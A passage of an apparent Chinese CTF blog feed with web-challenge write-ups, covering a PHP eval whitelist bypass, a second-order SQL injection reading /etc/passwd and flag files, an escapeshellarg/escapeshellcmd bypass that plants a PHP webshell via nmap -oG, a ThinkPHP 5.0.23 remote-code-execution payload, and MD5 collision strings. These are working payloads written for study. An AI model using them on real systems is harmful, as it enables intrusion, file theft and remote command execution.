    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  
    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;
        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//帮你算出答案</span>
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);
&#125;</code></pre></div>



<p>get提交参数c，c的长度不能超过80</p>
<p>不能包括blacklist中的字符</p>
<p>不能有不是$whitelist白名单里面的单词出现</p>
<p>并且函数只能以下面的格式出现</p>
<blockquote>
<p>abs(1)能过<br>1abs()能过<br>absa()不能过<br>abs(a)不能过<br>abs()a不能过</p>
</blockquote>
<p>代码的最后出现了 eval 这是我们想看到的，因为它出现的时候，就可能存在命令执行漏洞</p>
<p>这题实在是无能为力，看了王师傅的wp</p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">详情看这里</a></p>
<h3 id="0x2构造payload-1"><a href="#0x2构造payload-1" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>//这题需要使用到php复杂变量，具体可以看<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">这里</a></p>
<p>当这个题目没有给出那么限制的时候我们想要构造的payload一定是</p>
<div class="hljs"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">"cat /flag"</span>)</code></pre></div>

<p>但是由于限制，必须想办法绕过这些限制，比如多提交一个参数，构造出上面的payload</p>
<p>比如</p>
<div class="hljs"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[b])(<span class="hljs-symbol">$</span>_GET[a])&amp;b=<span class="hljs-keyword">system</span>&amp;a=cat /flag <span class="hljs-comment">//这里是b,a多提交的参数，不会被检测 这里的[]可以使用&#123;&#125;代替</span></code></pre></div>

<p>下面的具体工作就是如何利用上面提供的函数构造出 <code>_GET</code>，并且能够绕过检测。</p>
<p>首先看一下函数的白名单里给了哪些可以用的函数<strong>base_convert()，dechex</strong></p>
<p>还有一些短的函数名pi,cos,sin,tan等，因为限制了长度，所以要尽量使用短的函数名代替a和b</p>
<p><img src="https://i.loli.net/2020/12/05/GnP1emRYpJDd2Q6.png" srcset="/img/loading.gif" alt="base_convert"></p>
<p><img src="https://i.loli.net/2020/12/05/TsrCzK3hAl4ufEm.png" srcset="/img/loading.gif" alt="dechex"></p>
<p>开始的想法就是将利用base_canvert()，转化出一个_GET，但是发现base_convert()不支持_，并且转换出的字符是小写的</p>
<p><img src="https://i.loli.net/2020/12/05/9G4zKrO2HMoc1vN.png" srcset="/img/loading.gif" alt="image-20201205215546962"></p>
<p>所以这里用到了一个中间过渡的函数hex2bin()，与之功能想反的函数是bin2hex()</p>
<p><img src="https://i.loli.net/2020/12/05/JeivVF1qO8YyRmK.png" srcset="/img/loading.gif" alt="image-20201205220057762"></p>
<p>实现方法如下</p>
<p><img src="https://i.loli.net/2020/12/05/FVMbzCNOwkIsnWd.png" srcset="/img/loading.gif" alt="image-20201205215938937"></p>
<p>下面就是将_GET转换为十六进制数字</p>
<div class="hljs"><pre><code class="hljs gams"><span class="hljs-comment">//bin2hex("_GET")-&gt;5f474554</span>
?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-number">5</span>f474554);(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag</code></pre></div>

<p>想法是好的，但是这里不能直接提交，因为不符合上面的几种函数使用的格式</p>
<p>所以就要想办法使用一个函数把<code>5f474554</code>提交上去</p>
<p>这里用的是dechex，就是将十进制数转换为十六进制数，再交给hex2bin出来</p>
<p>所以这里有个逆过程就是将<code>5f474554</code>转换为十进制</p>
<div class="hljs"><pre><code class="hljs 1c">intval('5f<span class="hljs-number">474554</span>',<span class="hljs-number">16</span>);</code></pre></div>

<p>所以具体的payload如下</p>
<div class="hljs"><pre><code class="hljs gams">?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag

<span class="hljs-comment">//base_convert(37907361743,10,36)=&gt;hex2bin</span>
<span class="hljs-comment">//dechex(1598506324)=&gt;5f474554</span>
<span class="hljs-comment">//hex2bin('5f474554')=&gt;_GET</span>
<span class="hljs-comment">//$pi=_GET</span>
<span class="hljs-comment">//($_GET)&#123;1&#125;($_GET&#123;2&#125;)</span></code></pre></div>

<p>7分的题目果然不一样，看wp都写了好久</p>
<p>既然没有能力自己做出来，那就好好研究一下别人做题的思路，以便以后遇到类似题目能够有思路。</p>
<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><h3 id="0x1扫描目录"><a href="#0x1扫描目录" class="headerlink" title="0x1扫描目录"></a>0x1扫描目录</h3><p>拿到题目扫 一下目录，发现是出现.git，那应该就是git源码泄露，可是githacker下载下来的文件好像不全，看了看大佬的wp</p>
<p>暂时没搞懂是怎么下载的，日后再看细看</p>
<p>源码如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"mysql.php"</span>;
session_start();
<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'login'</span>] != <span class="hljs-string">'yes'</span>)&#123;
    header(<span class="hljs-string">"Location: ./login.php"</span>);
    <span class="hljs-keyword">die</span>();
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'do'</span>]))&#123;
<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">'do'</span>])
&#123;
<span class="hljs-keyword">case</span> <span class="hljs-string">'write'</span>:
    $category = addslashes($_POST[<span class="hljs-string">'category'</span>]);
    $title = addslashes($_POST[<span class="hljs-string">'title'</span>]);
    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);
    $sql = <span class="hljs-string">"insert into board</span>
<span class="hljs-string">            set category = '$category',</span>
<span class="hljs-string">                title = '$title',</span>
<span class="hljs-string">                content = '$content'"</span>;
    $result = mysql_query($sql);
    header(<span class="hljs-string">"Location: ./index.php"</span>);
    <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-string">'comment'</span>:
    $bo_id = addslashes($_POST[<span class="hljs-string">'bo_id'</span>]);
    $sql = <span class="hljs-string">"select category from board where id='$bo_id'"</span>;
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;
    $category = mysql_fetch_array($result)[<span class="hljs-string">'category'</span>];
    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);
    $sql = <span class="hljs-string">"insert into comment</span>
<span class="hljs-string">            set category = '$category',</span>
<span class="hljs-string">                content = '$content',</span>
<span class="hljs-string">                bo_id = '$bo_id'"</span>;
    $result = mysql_query($sql);
    &#125;
    header(<span class="hljs-string">"Location: ./comment.php?id=$bo_id"</span>);
    <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">default</span>:
    header(<span class="hljs-string">"Location: ./index.php"</span>);
&#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    header(<span class="hljs-string">"Location: ./index.php"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>可以看到在write部分提交的都是经过转义后带入查询语句查询的，但是下面的comment中category没有经过任何过滤就带入了sql语句进行查询，这就可能存在二次注入。</p>
<h3 id="0x2二次注入"><a href="#0x2二次注入" class="headerlink" title="0x2二次注入"></a>0x2二次注入</h3><p>进入题目可以提交评论，但是要登录，给了提示</p>
<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>zhangwei
<span class="hljs-symbol">password:</span>zhangwei***</code></pre></div>

<p>使用bp爆破出的密码是zhangwei666</p>
<p><img src="https://i.loli.net/2020/12/07/8Xx35WQfTARLcnz.png" srcset="/img/loading.gif" alt="image-20201207093624672"></p>
<p>登录后先进入发帖的界面,构造payload</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;$category&#39;,
                content &#x3D; &#39;$content&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>

<p>之前sql注入方法中经常使用的注释方法都是当行注释，但是这个题目的查询使用的是多行，所以这里注释也需要使用多行注释  /**/ </p>
<p>在这里注入的sql语句，在comment页面会被sql重新调出来，从而执行了注入语句，这也是为啥叫做二次注入</p>
<p>于是构造的sql语句如下</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,
                content &#x3D; &#39;*&#x2F;#&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>

<p>因为中间的 cntent被包围在多行注释中间，所以这里不起作用等价于</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;&#39;,content&#x3D;user(),
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>

<p>当在评论页面评论<code>*/#</code>时，会与之前的<code>/*</code>的进行闭合，就够造出了我们想要的sql语句，user()这个sql函数就会被执行，显示当前的用户</p>
<p><img src="https://i.loli.net/2020/12/07/DEre87viLhH6Aby.png" srcset="/img/loading.gif" alt="image-20201207094017109"></p>
<p> 原理知道了，下面就是具体的做这个题目</p>
<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong></p>
<p><img src="https://i.loli.net/2020/12/07/rg5k8mAsKST3hea.png" srcset="/img/loading.gif" alt="image-20201207094741282"></p>
<p>可以看到是有www用户的，那么久存在<strong>.bash_history</strong> 记录，继续查看</p>
<div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span>.<span class="hljs-params">bash_history</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>





<p><img src="https://i.loli.net/2020/12/07/7YDFXWbGHcxNqAk.png" srcset="/img/loading.gif" alt="image-20201207094934593"></p>
<p>也就是以下几条指令</p>
<div class="hljs"><pre><code class="hljs routeros">cd  /tmp/ 
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd  /var/www/html/
rm -f .DS_Store
service apache2 start</code></pre></div>

<p>可以看出来 <code>.Ds_Store</code>是存在/tmp/html目录下的，那就看看有什么</p>
<p>直接查看该文件会发现长度不够，而且显示不可见字符</p>
<p><img src="https://i.loli.net/2020/12/07/Bl5n6KNOTUdGb1Z.png" srcset="/img/loading.gif" alt="image-20201207095822022"></p>
<p>使用hex()就可以解决这个问题</p>
<div class="hljs"><pre><code class="hljs sql">title=1&amp;category=',content=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>( <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/tmp/html/.DS_Store'</span>))),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>

<p>在线解码后可以看到以下内容，存在一个 <code>flag_8946e1ff1ee3e40f.php</code></p>
<p><img src="/2020/11/30/adworld/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201207100157447.png" srcset="/img/loading.gif" alt="image-20201207100157447"></p>
<p>查看flag，但是要注意的是，这个文件是从 /var/www/html/中复制过来的，所以还是要到那个目录读取</p>
<div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select hex( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">flag_8946e1ff1ee3e40f</span>.<span class="hljs-params">php</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>



<p><img src="https://i.loli.net/2020/12/07/Ce9WJYTFU5HMrOp.png" srcset="/img/loading.gif" alt="image-20201207101235024"></p>
<p>在线解码即可</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>buuctf-z7z8</title>
    <url>/2020/10/08/buuoj-z7z8/</url>
    <content><![CDATA[<p>buuctf上的其他题型的集合，懒得分类了</p>
<h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
  $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
  $host = $_GET[<span class="hljs-string">'host'</span>];
  $host = escapeshellarg($host);
  $host = escapeshellcmd($host);
  $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
  @mkdir($sandbox); <span class="hljs-comment">//创建了路径</span>
  chdir($sandbox);
  <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
&#125;</code></pre></div>

<p>前面的两段代码没啥用，主要是后面处理  <code>host</code>的过程</p>
<p><strong>1.知识储备</strong></p>
<blockquote>
<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
</blockquote>
<blockquote>
<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$<code>,</code>\x0A<code>和</code>\xFF<code>。</code>‘<code>和</code>“<code>仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及</code>%<code>和</code>!` 字符都会被空格代替。</p>
</blockquote>
<p><strong>namp命令</strong></p>
<blockquote>
<p><code>-T5</code> :扫描等级,越大越快,越快越不安全,最好设置为<code>-T4</code><br><code>-sT</code> :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试<br><code>-Pn</code> :禁用ping<br><code>-host-timeout 2</code>:设置扫描一台主机的时间，以毫秒为单位。<br><code>-F</code> :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p>
</blockquote>
<p><strong>漏洞点在这</strong></p>
<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p><strong>2.构造payload</strong></p>
<blockquote>
<ol>
<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li>
</ol>
</blockquote>
<p><strong>回到<code>mail</code>中，我们的 payload 最终在执行时变成了<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，最终的参数就是这样被注入的。</strong></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">参考</a></p>
<p>需要绕过上面的两个函数，先试试两个函数的作用</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$host = <span class="hljs-string">" 1'shellcode "</span>;
$host = escapeshellarg($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;
$host = escapeshellcmd($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-meta">?&gt;</span>
<span class="hljs-string">' 1'</span>\<span class="hljs-string">''</span>shellcode <span class="hljs-string">'</span>
<span class="hljs-string">'</span> <span class="hljs-number">1</span><span class="hljs-string">'\\'</span><span class="hljs-string">'shellcode \'</span></code></pre></div>

<p>构造的一句话木马为：<code>&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39;</code></p>
<p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
<p>这里的单引号都是成对出现的，所以没影响</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @shellcode<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/1kHWE9zFn6L3XsB.png" srcset="/img/loading.gif" alt="online1.png"></p>
<p>上传文件的保存路径，利用蚁剑链接一下</p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
<p>(写的有点乱)</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示  <code>BY THINKPHP5</code></p>
<p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
<p>先看看报错信息:1 <code>url+?s=1</code></p>
<p><img src="https://i.loli.net/2020/10/24/3H6YjEuRLQfGl28.png" srcset="/img/loading.gif" alt="cve-1.png"></p>
<p>php版本为5.0.23，上网搜了一下这版本的漏洞</p>
<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
<p>直接构造payload，读取目录</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=ls /</code></pre></div>

<p>看到了flag文件</p>
<p>读取flag</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div>



<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><div class="hljs"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
$flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'gg'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>])) &#123;
	$id=$_GET[<span class="hljs-string">'id'</span>];
	$gg=$_GET[<span class="hljs-string">'gg'</span>];
	<span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'You got the first step'</span>;
		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
			$passwd=$_POST[<span class="hljs-string">'passwd'</span>];
			<span class="hljs-keyword">if</span> (!is_numeric($passwd)) &#123;
				<span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>) &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">'Good Job!'</span>;
					highlight_file(<span class="hljs-string">'flag.php'</span>);
					<span class="hljs-keyword">die</span>(<span class="hljs-string">'By Retr_0'</span>);
				&#125; <span class="hljs-keyword">else</span> &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">"can you think twice??"</span>;
				&#125;
			&#125; <span class="hljs-keyword">else</span> &#123;
				<span class="hljs-keyword">echo</span> <span class="hljs-string">'You can not get it !'</span>;
			&#125;
		&#125; <span class="hljs-keyword">else</span> &#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'only one way to get the flag'</span>);
		&#125;
	&#125; <span class="hljs-keyword">else</span> &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"You are not a real hacker!"</span>;
	&#125;
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Please input first'</span>);
&#125;
&#125;</code></pre></div>

<p>先F12找一找提示，原来就是格式化好的源码</p>
<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-name">md5</span>($id) === md5($gg) <span class="hljs-symbol">&amp;&amp;</span> $id !== $gg)</code></pre></div>

<p>直接使用数组绕过，也可以使用md5强碰撞的两字符串</p>
<div class="hljs"><pre><code class="hljs llvm">param<span class="hljs-number">1</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span>
param<span class="hljs-number">2</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1</span><span 